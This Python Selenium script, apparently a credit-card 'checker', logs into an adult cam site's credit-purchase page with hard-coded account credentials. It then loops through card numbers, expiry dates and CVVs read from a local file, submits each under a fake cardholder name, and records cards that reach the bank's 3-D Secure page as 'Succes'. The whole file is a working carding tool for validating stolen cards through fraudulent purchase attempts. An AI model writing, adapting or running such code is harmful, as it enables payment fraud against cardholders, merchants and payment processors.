#HELP:  https://selenium-python.readthedocs.io/locating-elements.html

import time
from threading import Thread
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from colorama import init
from colorama import Fore, Back, Style

init()

driver = webdriver.Firefox()

#Open Page

driver.get('https://live.sex/en/credit/')

#Login Page

login = driver.find_element(By.CSS_SELECTOR, 'a.button-fluid:nth-child(4)')
login.click()

username = driver.find_element(By.ID, 'nickname')
username.send_keys('00GZA0098')

password = driver.find_element(By.ID, 'password')
password.send_keys('11kerem11R')

logIn = driver.find_element(By.CSS_SELECTOR, 'div.row:nth-child(9) > div:nth-child(1) > button:nth-child(1)')
logIn.click()

time.sleep(5)

#Add Credit

file = open('/home/gza/Desktop/CC Checker/cc.txt', 'r')
Lines = file.readlines()

for line in Lines:

	driver.get('https://live.sex/en/credit/')

	time.sleep(5)
	try:
		ADD_CREDIT = driver.find_element(By.CLASS_NAME, 'credit-pack-box-container')
		ADD_CREDIT.click()
	except:
		time.sleep(5)
		ADD_CREDITFF = driver.find_element(By.CLASS_NAME, 'credit-pack-box-container')
		ADD_CREDITFF.click()

	time.sleep(5)
	if(driver.current_url != 'https://www.billingccmedia.com/index.php?p=index'):
		driver.get('https://www.billingccmedia.com/index.php?p=index')

	time.sleep(5)

	while(driver.current_url != 'https://www.billingccmedia.com/index.php?p=index'):
		time.sleep(1)

	#Payment

	card_number = line[0]+line[1]+line[2]+line[3]+line[4]+line[5]+line[6]+line[7]+line[8]+line[9]+line[10]+line[11]+line[12]+line[13]+line[14]+line[15]
	card_month = line[17]+line[18]
	card_year = line[20]+line[21]+line[22]+line[23]
	card_cvv = line[25]+line[26]+line[27]

	time.sleep(5)

	try:
		name_BANK_CARD = driver.find_element(By.ID, 'cardNom')
		name_BANK_CARD.send_keys('Jhonson')
	except:		
		driver.get('https://live.sex/en/credit/')

		time.sleep(5)
		try:
			ADD_CREDITR = driver.find_element(By.CLASS_NAME, 'credit-pack-box-container')
			ADD_CREDITR.click()
		except:
			time.sleep(5)
			ADD_CREDITFFrr = driver.find_element(By.CLASS_NAME, 'credit-pack-box-container')
			ADD_CREDITFFrr.click()
		time.sleep(5)
		name_BANK_CARDw = driver.find_element(By.ID, 'cardNom')
		name_BANK_CARDw.send_keys('Jhonson')

	lastname_BANK_CARD = driver.find_element(By.ID, 'cardPrenom')
	lastname_BANK_CARD.send_keys('Smithh')

	cardnumber = driver.find_element(By.ID, 'cardNumber')
	cardnumber.send_keys(card_number)

	cardmonth = driver.find_element(By.NAME, 'mois')
	cardmonth.send_keys(card_month)

	cardyear = driver.find_element(By.NAME, 'an')
	cardyear.send_keys(card_year)

	cardcvv = driver.find_element(By.ID, 'cardCVV2')
	cardcvv.send_keys(card_cvv)

	NowURI = driver.current_url

	SUBMIT = driver.find_element(By.ID, 'btnSubmit')
	SUBMIT.click()

	#Check

	time.sleep(10)

	if(driver.current_url == 'https://emvacs.bkm.com.tr/acs/creq'):
		print(Fore.GREEN + 'Succes --> ' + str(card_number) + '|' + str(card_month) + '|' + str(card_year) + '|' + str(card_cvv))
		OLDFILE = open('/home/gza/Desktop/CC Checker/succes.txt', 'r')
		lines0 = OLDFILE.read()
		OLDFILE.close()
		sucFILE = open('/home/gza/Desktop/CC Checker/succes.txt','w')
		sucFILE.write(lines0 + str(card_number) + '|' + str(card_month) + '|' + str(card_year) + '|' + str(card_cvv) + '\n')
		sucFILE.close()
	else:
		print(Fore.RED + 'Fail --> ' + str(card_number) + '|' + str(card_month) + '|' + str(card_year) + '|' + str(card_cvv))
		#Ohh, check
		time.sleep(5)
		if(driver.current_url == 'https://emvacs.bkm.com.tr/acs/creq'):
			#Oh Sorry IM FIXING
			print(Fore.GREEN + 'Succes --> ' + str(card_number) + '|' + str(card_month) + '|' + str(card_year) + '|' + str(card_cvv))
			OLDFILEll = open('/home/gza/Desktop/CC Checker/succes.txt', 'r')
			lines0ll = OLDFILEll.read()
			OLDFILEll.close()
			sucFILEll = open('/home/gza/Desktop/CC Checker/succes.txt','w')
			sucFILEll.write(lines0ll + str(card_number) + '|' + str(card_month) + '|' + str(card_year) + '|' + str(card_cvv) + '\n')
			sucFILEll.close()








	#nowuri = driver.current_url
	#if(nowuri == NowURI):
	#	time.sleep(5)

	#nowuri = driver.current_url
	#check = nowuri.find('error')

	#if(check > 0):
	#if(driver.current_url == ''):
	#	print(Fore.RED + 'Fail --> ' + str(card_number) + '|' + str(card_month) + '|' + str(card_year) + '|' + str(card_cvv))
	#	try:
	#		CheckFail = driver.find_element(By.CSS_SELECTOR, '.info > font:nth-child(4) > b:nth-child(1)')
	#		if(CheckFail.text.upper() != 'ERROR'):
	#			print(Fore.YELLOW + 'UNKNOWN --> ' + str(card_number) + '|' + str(card_month) + '|' + str(card_year) + '|' + str(card_cvv))
	#	except: 
	#		print(Fore.YELLOW + 'UNKNOWN --> ' + str(card_number) + '|' + str(card_month) + '|' + str(card_year) + '|' + str(card_cvv))
	
	#else:
	#	print(Fore.GREEN + 'Succes --> ' + str(card_number) + '|' + str(card_month) + '|' + str(card_year) + '|' + str(card_cvv))
	#	OLDFILE = open('/home/gza/Desktop/CC Checker/succes.txt', 'r')
	#	lines0 = OLDFILE.read()
	#	OLDFILE.close()
	#	sucFILE = open('/home/gza/Desktop/CC Checker/succes.txt','w')
	#	sucFILE.write(lines0 + str(card_number) + '|' + str(card_month) + '|' + str(card_year) + '|' + str(card_cvv) + '\n')
	#	sucFILE.close()

file.close()
driver.close()
